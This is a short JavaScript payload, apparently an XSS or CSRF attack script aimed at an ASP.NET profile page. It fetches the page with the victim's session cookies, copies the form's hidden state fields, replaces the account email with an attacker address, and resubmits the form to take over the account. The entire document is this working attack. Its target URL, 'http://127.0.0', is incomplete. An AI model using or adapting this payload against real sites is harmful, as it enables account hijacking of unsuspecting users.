;(async () => {
  try {
    // 1. Fetch the profile page
    const html = await fetch("http://127.0.0", { credentials: "include" })
      .then(r => {
        if (!r.ok) throw new Error(`HTTP error! Status: ${r.status}`);
        return r.text();
      });

    // 2. Parse the HTML
    const doc = new DOMParser().parseFromString(html, "text/html");
    const form = doc.querySelector("form");
    
    if (!form) {
      throw new Error("Could not find a <form> element on the fetched page.");
    }

    // 3. Extract form parameters
    const base = "http://127.0.0";
    const action = new URL(form.getAttribute("action") || "", base).href;
    const data = new FormData(form);

    // 4. Modify form values
    data.set("__EVENTTARGET", "ctl00\$MainbtnSavebtnPrimary");
    data.set("__EVENTARGUMENT", "");
    data.set("ctl00\$MaintxtEmailtxtText", "attacker@malicious.com");

    // 5. Submit the form
    const res = await fetch(action, { 
      method: "POST", 
      credentials: "include", 
      body: data 
    });

    console.log(res.ok ? "Profile updated successfully!" : "Failed to update profile", res.status);

  } catch (error) {
    // This will catch and print any failure (network, null pointers, etc.)
    console.error("Script execution failed:", error);
  }
})();


